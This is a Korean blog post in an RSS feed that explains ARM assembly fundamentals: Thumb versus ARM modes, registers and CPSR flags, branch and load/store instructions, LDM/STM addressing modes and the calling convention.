      <content:encoded><![CDATA[<h1 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h1><ul><li>ARM (Advanced Risc Machine)</li><li>Thumb 모드 / ARM 모드<ul><li>ARM Instruction</li><li>Thumb Instruction</li></ul></li><li>ARM 레지스터</li><li>ARM Intruction</li><li>ARM Assembly<ul><li>Branch Instruction (분기 명령)</li><li>LDR and STR Instruction (단일 데이터 이동명령)</li><li>LDM and STM Instruction (여러개의 데이터 이동명령)</li></ul></li><li>콜링 컨벤션</li><li>레퍼런스</li><li>문서 역사</li></ul><hr><h3 id="ARM-Advanced-Risc-Machine"><a href="#ARM-Advanced-Risc-Machine" class="headerlink" title="ARM (Advanced Risc Machine)"></a>ARM (Advanced Risc Machine)</h3><p><code>RISC</code>를 사용하는 대표적인 언어중 하나이며 <code>임베디드 장비</code>에 많이 쓰인다.</p><ul><li><p><strong>RISC</strong> (Reduced Instruction Set Computer)</p><ul><li><p>CPU 명령어의 개수를 줄여서 CISC 방식보다 구조를 간단하게 한 것</p></li><li><p>32비트로 명령어의 크기가 동일하다. (고정길이 명령)</p></li><li>대표적으로 <code>arm</code>, <code>mips</code>에서 사용한다.</li></ul></li><li><p><strong>CISC</strong> (Complex Instruction Set Computer)</p><ul><li>명령어의 수가 많고 처리하는 시간이 길어서 대기 시간이 길다.</li><li>대표적으로 <code>x86</code>에서 사용한다.</li></ul></li></ul><p><hr></p><h3 id="Thumb-모드-ARM-모드"><a href="#Thumb-모드-ARM-모드" class="headerlink" title="Thumb 모드 / ARM 모드"></a>Thumb 모드 / ARM 모드</h3><p><strong>ARM에는 두가지의 명령어 체계가 존재</strong>한다. 명령어가 16bit인 것도 있고 32bit인 것도 있다. <strong>32bit 명령어를 <code>ARM Instruction</code></strong> 이라고 하고 <strong>16bit 짜리 명령어를 <code>Thumb Instruction</code></strong> 이라고 한다.</p><p><strong>컴파일러가 <code>CPSR</code>의 5번째 bit인 <code>T flag</code>를 참조해서 ARM 모드인지, Thumb 모드인지 판단</strong>해서 적용시킨다. <strong><code>BX</code> / <code>BLX</code> 명령을 이용해서 모드 전환</strong>이 이루어지며 Branch를 수행한다.</p><ul><li><strong>ARM Instruction</strong><ul><li><strong>처리속도를 우선시</strong> 할 때 사용<ul><li>ARM은 32bit 프로세서이며 16bit 명령어를 처리하기 위해선 처리 과정을 한 번더 거치게 된다. (즉, 효율성이 감소)</li></ul></li></ul></li><li><strong>Thumb Instruction</strong><ul><li><strong>코드 길이를 줄일때</strong> 사용<ul><li>ARM 모드로 작성한 프로그램의 크기의 70%밖에 되지 않는다.</li><li><strong>셸코드를 작성할 때도 당연히 바이트 수를 줄이기 위해 Thumb 모드를 사용</strong>하는게 좋다.</li></ul></li></ul></li></ul><p><hr></p><h3 id="ARM-레지스터"><a href="#ARM-레지스터" class="headerlink" title="ARM 레지스터"></a>ARM 레지스터</h3><ul><li><code>R0 ~ R10</code>: 범용레지스터로서 연산 및 임시 저장 장소 등으로 사용 (<strong>Thumb Mode는 R7까지 사용</strong>)<ul><li><strong>R0</strong>: 함수의 <strong>반환 값</strong>을 저장, 함수의 <strong>첫 번째 인자</strong> 저장</li><li><strong>R1</strong>: 함수의 <strong>두 번째 인자</strong> 저장 </li><li><strong>R2</strong>: 함수의 <strong>세 번째 인자</strong> 저장</li><li><strong>R3</strong>: 함수의 <strong>네 번째 인자</strong> 저장</li><li><strong>R7</strong>: <strong>Thumb mode에서 syscall number</strong>를 저장</li></ul></li><li><code>R11 ~ R15</code>: 특수한 목적으로 사용<ul><li><strong>R13</strong>:  <code>SP</code>(Stack Pointer),  <strong>현재 스택의 최상단의 주소</strong>를 저장</li><li><strong>R14</strong>: <code>LR</code>(Link Register), <strong>복귀 주소</strong>(return address)를 저장</li><li><strong>R15</strong>: <code>PC</code>(Program Counter), <strong>다음 실행할 명령의 주소</strong>를 저장</li></ul></li><li><code>PSR</code>: 상태 레지스터<ul><li><strong>SPSR</strong>: 모드가 변경될 때 마다 변경되기 전의 CPSR을 저장</li><li><strong>CPSR</strong>: <strong>현재 동작중인 프로세서의 상태</strong>를 저장<ul><li><img src="https://user-images.githubusercontent.com/43925259/65316068-33326080-dbd4-11e9-9492-eb2fe8ca2f68.png" alt="1568717584116"><ul><li><strong>N</strong>: 연산 결과가 음수일 경우</li><li><strong>Z</strong>: 연산 결과가 0인 경우</li><li><strong>C</strong>: 연산 결과에서 자리올림이 발생한 경우</li><li><strong>V</strong>: 연산 결과가 overflow가 발생한 경우</li></ul></li></ul></li></ul></li></ul><p><hr></p><h3 id="ARM-Intruction"><a href="#ARM-Intruction" class="headerlink" title="ARM Intruction"></a>ARM Intruction</h3><ul><li><p><strong>Load / Store 구조를 사용</strong></p><ul><li>ARM은 메모리 내의 데이터에 직접 접근이 불가능</li><li><code>LDR</code>, <code>STR</code>과 같은 명령을 통해서 메모리와 레지스터 사이에 데이터를 전송</li></ul></li><li><p><strong>3-Address data Processing</strong></p><ul><li><img src="https://user-images.githubusercontent.com/43925259/65316071-34fc2400-dbd4-11e9-8ce2-2359099cb254.png" alt="1568719174865"></li><li>두 개의 source operand와 result operand를 사용</li><li>result 위치엔 항상 레지스터가 오고 OP 자리엔 레지스터 또는 상수</li></ul></li><li><p><strong>모든 명령어는 조건부 실행 가능</strong></p><ul><li>CPSR 레지스터에 Condition Flag 정보에 맞춰서 분기 (N, Z, C, V)</li><li>ARM의 모든 명령어는 조건필드를 가지고 있고 조건에 따라 실행 여부를 결정<ul><li>Ex) ADD<strong>EQ</strong> r0, r1, r2    ; if Z=1, then r0 = r1 + r2</li></ul></li><li>명령어의 접미사<ul><li><img src="https://user-images.githubusercontent.com/43925259/65315814-b901dc00-dbd3-11e9-9416-5103eb9595a0.png" alt="1568967362291"></li></ul></li></ul><hr></li></ul><h3 id="ARM-Assembly"><a href="#ARM-Assembly" class="headerlink" title="ARM Assembly"></a>ARM Assembly</h3><ul><li><h5 id="Branch-Instruction-분기-명령"><a href="#Branch-Instruction-분기-명령" class="headerlink" title="Branch Instruction (분기 명령)"></a>Branch Instruction (분기 명령)</h5><ul><li><strong><code>B (Branch)</code></strong><ul><li>사용법: <code>B 주소</code></li><li>B 명령어 뒤에 <strong>지정된 주소로 분기</strong>하는 명령</li><li>x86의 <code>jmp</code>와 유사</li></ul></li><li><strong><code>BL (Branch with Link)</code> </strong><ul><li>사용법: <code>BL 주소</code></li><li>BL 명령어 뒤에 <strong>지정된 주소로 분기하되 복귀 주소를 R14에 저장</strong></li><li>x86의 <code>call</code>과 유사</li></ul></li><li><strong><code>BX (Branch indirect)</code></strong><ul><li>사용법: <code>BX 레지스터</code></li><li>BX 명령어 뒤에 <strong>지정된 레지스터로 분기</strong>하는 명령</li></ul></li><li><strong><code>BLX (Branch indirect with Link)</code></strong><ul><li>사용법: <code>BLX 레지스터</code></li><li>BLX 명령어 뒤에 <strong>지정된 레지스터로 분기하되 복귀 주소를 R14에 저장</strong></li></ul></li></ul></li><li><h5 id="LDR-and-STR-Instruction-단일-데이터-이동명령"><a href="#LDR-and-STR-Instruction-단일-데이터-이동명령" class="headerlink" title="LDR and STR Instruction (단일 데이터 이동명령)"></a>LDR and STR Instruction (단일 데이터 이동명령)</h5><ul><li><p><strong><code>LDR (Load register)</code></strong></p><ul><li>사용법: <code>ldr 레지스터, 메모리</code></li><li><strong>메모리에서 4byte 읽어서 레지스터로 복사</strong>하는 명령</li></ul></li><li><p><strong><code>STR (Store register)</code></strong></p><ul><li>사용법: <code>str 레지스터, 메모리</code></li><li><strong>레지스터의 값을 메모리에 4byte 만큼 복사</strong>하는 명령 (<strong>복사 방향 주의</strong>)</li></ul></li><li><p><strong><code>LDR, STR의 접미사</code></strong></p><ul><li><strong>H: 2byte</strong></li><li><strong>B: 1byte</strong></li><li>그냥 사용하면 4byte로 동작하고 <code>LDRH</code>, <code>STRB</code>와 같이 <code>2byte</code>, <code>1byte</code>씩 동작가능</li></ul></li><li><p><code>pre-indexed와 post-indexed</code></p><ul><li><p><strong>pre-indexed</strong></p><ul><li>LDR R0, [R1, #0x8]과 같이 <strong>오프셋이 대괄호안에 들어가있는 경우</strong></li><li><strong>기준 레지스터(예시에서의 R1)로부터 오프셋만큼 떨어진 주소에서 4byte 만큼 복사</strong></li><li><strong>기준 레지스터의 값은 변하지 않음.</strong></li><li><strong>끝에 !를 붙히면 기준 레지스터의 값이 변함.</strong> (LDR R0, [R1, #0x8]!)</li></ul></li><li><p><strong>post-indexed</strong></p><ul><li>LDR R0, [R1], 0x8과 같이 <strong>오프셋이 대괄호밖에 있는 경우</strong></li><li><strong>기준 레지스터(예시에서의 R1)에서 4byte만큼 복사 후 기준 레지스터 값을 오프셋 만큼 변경</strong></li></ul></li></ul></li></ul></li></ul><ul><li><p><strong>LDM and STM Instruction (여러개의 데이터  이동)</strong> </p><ul><li><strong><code>LDM (Load Multiple Register)</code></strong><ul><li>사용법1: <code>LDM??  메모리, {레지스터, 레지스터, ...}</code></li><li>사용법2: <code>LDM?? 메모리, {레지스터-레지스터}</code></li><li><strong>메모리에 있는 값을 레지스터로 복사하는 명령</strong>이다. (<strong>복사 방향 주의</strong>)</li><li>무조건 <strong>워드(32-bit) 단위의 복사만 존재</strong>한다.</li><li>레지스터를 표현할때 쉼표(,)로 쓰면 특정 레지스터를 의미하고 하이픈(-)을 사용하면 연속된 레지스터를 참조하는 것이다. (R1-R3 이라면 R1, R2, R3과 동일)</li></ul></li><li><strong><code>STM (Store Multiple Register)</code></strong><ul><li>사용법1: <code>STM?? 메모리, {레지스터, 레지스터, ...}</code></li><li>사용법2: <code>STM?? 메모리, {레지스터-레지스터}</code></li><li><strong>여러개의 레지스터 값을 메모리로 복사하는 명령</strong>이다. </li><li>마찬가지로 <strong>워드(32-bit) 단위의 복사만 존재</strong>한다.</li></ul></li><li><strong><code>LDM과 STM의 어드레싱 모드</code></strong> (<strong>LDM과 STM의 접미사</strong>)<ul><li><code>IA</code>: 연산 이후 메모리 값(베이스 레지스터)을 한 워드 증가</li><li><code>IB</code>: 연산 이전에 메모리 값을 한 워드 증가</li><li><code>DA</code>: 연산 이후에 메모리 값을 한 워드 감소</li><li><code>DB</code>: 연산 이전에 메모리 값을 한 워드 감소</li></ul></li></ul></li></ul><p><hr></p><h3 id="콜링-컨벤션"><a href="#콜링-컨벤션" class="headerlink" title="콜링 컨벤션"></a>콜링 컨벤션</h3><ul><li><strong><code>R0 ~ R3</code> 까지 순서대로 인자를 저장</strong></li><li><strong>인자가 5개 이상이면 <code>스택</code>을 사용</strong></li><li><strong>함수의 반환 값은 <code>R0</code>을 사용</strong></li><li><strong><code>BL</code> 또는 <code>BLX</code>를 사용할 때 복귀 주소를 <code>R14</code> 레지스터에 저장</strong></li></ul><p><hr></p><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p><a href="http://blog.daum.net/goldhjw/7406090" target="_blank" rel="noopener">http://blog.daum.net/goldhjw/7406090</a></p><p><a href="http://trace32.com/wiki/index.php/Cortex-M" target="_blank" rel="noopener">http://trace32.com/wiki/index.php/Cortex-M</a></p><p><a href="https://dreamlog.tistory.com/121" target="_blank" rel="noopener">https://dreamlog.tistory.com/121</a></p><p><a href="https://drive.google.com/file/d/0B_sx6nhKufWqRTdZemNETVhxVWM/view" target="_blank" rel="noopener">https://drive.google.com/file/d/0B_sx6nhKufWqRTdZemNETVhxVWM/view</a></p><hr><h3 id="문서-역사"><a href="#문서-역사" class="headerlink" title="문서 역사"></a>문서 역사</h3><p><code>2019-09-20</code>  <strong>JSec: 최초 작성</strong></p><hr><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/20/Rev/%E3%84%B4%20Research/ARM_%EA%B8%B0%EC%B4%88/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
